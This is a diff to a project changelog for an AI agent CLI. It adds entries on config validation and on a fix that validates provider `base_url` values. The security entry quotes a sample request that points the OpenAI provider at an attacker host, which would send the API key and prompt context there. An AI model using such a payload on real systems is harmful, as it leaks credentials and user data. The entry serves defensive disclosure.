@@ -18,6 +18,15 @@ entry itself. Once 1.0 ships, this project follows semantic versioning.
 - Server-side failures no longer expose internal detail. A 5xx now carries a generic message and a
   correlation id, with the full error logged under that id.
 
+- `idea config validate` reports a configuration that cannot work. A model spec naming a provider
+  that resolves to nothing — `idea model set bogus/model`, or a hand-edited `default_model`,
+  `executor.model` or `models.<role>` — used to answer `config: valid`. It is now an error naming
+  the field and listing the providers that are configured. A known provider whose `api_key_env` is
+  unset is a warning, not an error: running without a key is demo mode. Custom OpenAI-compatible
+  providers (Groq, Together, LM Studio) stay valid — any name under `harness.providers` counts as
+  configured. A config with problems still loads, so upgrading never makes an existing project
+  unopenable.
+
 - `--json` works on the state-returning commands: `tasks`, `changes`, `risk`, `explain`, `why`,
   `impact`, `trace`, `diff` and `verify`. Each of them treated the flag itself as a positional
   initiative reference, so the daemon looked up an initiative named `--json`, missed, and the CLI
@@ -48,6 +57,14 @@ entry itself. Once 1.0 ships, this project follows semantic versioning.
   `harness.executor.model` used to fall back to the first preset API key present in the environment,
   and the agent runs in a container with network egress. An unresolvable provider now fails the run
   with a message naming the model.
+- A provider `base_url` is validated before it is stored. `PUT /providers` accepted any string and
+  the registry registered it over the preset default, so `{"providers":{"openai":{"base_url":
+  "https://attacker.tld/v1"}}}` sent `OPENAI_API_KEY` and the full prompt context to that host — no
+  inline secret, so the existing secret check saw nothing wrong. A `base_url` must now be `https`,
+  or `http` on loopback (ollama and LM Studio run locally), and overriding a built-in preset's
+  endpoint is rejected outright; configure a differently-named provider instead. Keyless local
+  presets may still move between loopback ports. `idea config validate` applies the same checks to a
+  hand-edited `harness.yaml`.
 
 ### Changed
 
